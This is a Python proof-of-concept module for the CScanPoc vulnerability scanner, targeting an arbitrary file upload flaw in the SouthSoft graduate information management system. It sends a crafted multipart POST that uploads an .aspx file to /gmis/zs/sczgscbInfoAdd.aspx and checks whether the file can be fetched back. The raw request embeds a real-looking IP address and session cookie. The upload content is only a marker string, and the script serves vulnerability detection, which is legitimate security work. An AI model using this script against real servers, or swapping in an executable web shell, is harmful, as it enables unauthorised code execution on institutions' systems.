# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
hh = hackhttp.hackhttp()


class Vuln(ABVuln):
    vuln_id = 'SouthSoft_0001'  # 平台漏洞编号，留空
    name = '南软研究生信息管理系统任意上传'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.FILE_UPLOAD  # 漏洞类型
    disclosure_date = '2015-06-04'  # 漏洞公布时间
    desc = '''
        南软公司分别在教育、政府机关、烟草、企业等多个领域展开了软件研发，电子商务应用及系统集成工作。
        南软研究生信息管理系统任意上传漏洞。
        /gmis/zs/sczgscbInfoAdd.aspx
    '''  # 漏洞描述
    ref = 'https://bugs.shuimugan.com/bug/view?bug_no=98176'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'SouthSoft'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '59b67026-cdd0-425b-bbef-8fd68566df50'
    author = '国光'  # POC编写者
    create_date = '2018-05-15'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            arg = '{target}'.format(target=self.target)
            raw1 = '''
POST /gmis/zs/sczgscbInfoAdd.aspx HTTP/1.1
Host: 211.64.205.214
Proxy-Connection: keep-alive
Content-Length: 818
Cache-Control: max-age=0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Origin: http://211.64.205.214
User-Agent: Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.122 Safari/537.36 SE 2.X MetaSr 1.0
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryNNHfzqBMQ1CNoTfG
Referer: http://211.64.205.214/gmis/zs/sczgscbInfoAdd.aspx
Accept-Encoding: gzip,deflate
Accept-Language: zh-CN,zh;q=0.8
Cookie: ASP.NET_SessionId=zy2rsy45ry0s2ljybsavbm55

------WebKitFormBoundaryNNHfzqBMQ1CNoTfG
Content-Disposition: form-data; name="__EVENTTARGET"

cmdAdd
------WebKitFormBoundaryNNHfzqBMQ1CNoTfG
Content-Disposition: form-data; name="__EVENTARGUMENT"


------WebKitFormBoundaryNNHfzqBMQ1CNoTfG
Content-Disposition: form-data; name="__VIEWSTATE"

dDwxNjY1MTUyNzEzO3Q8O2w8aTwxPjs+O2w8dDxwPGw8ZW5jdHlwZTs+O2w8bXVsdGlwYXJ0L2Zvcm0tZGF0YTs+Pjs7Pjs+Pjs+mHDOaNHdqKcabGLklJcaRVdON64=
------WebKitFormBoundaryNNHfzqBMQ1CNoTfG
Content-Disposition: form-data; name="txtMC"

testvul
------WebKitFormBoundaryNNHfzqBMQ1CNoTfG
Content-Disposition: form-data; name="myFile"; filename="xq17.aspx"
Content-Type: application/xml

testvul
------WebKitFormBoundaryNNHfzqBMQ1CNoTfG
Content-Disposition: form-data; name="txtBZ"

testvul
------WebKitFormBoundaryNNHfzqBMQ1CNoTfG--'''
            url = arg + '/gmis/zs/sczgscbInfoAdd.aspx'
            payload = arg+'/gmis/ZS/uploadfiles/xq17.aspx'
            code, head, res, errcode, _ = hh.http(url, raw=raw1)
            code1, head, res, errcode, _ = hh.http(payload)
            if code1 == 200 and 'testvul' in res:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
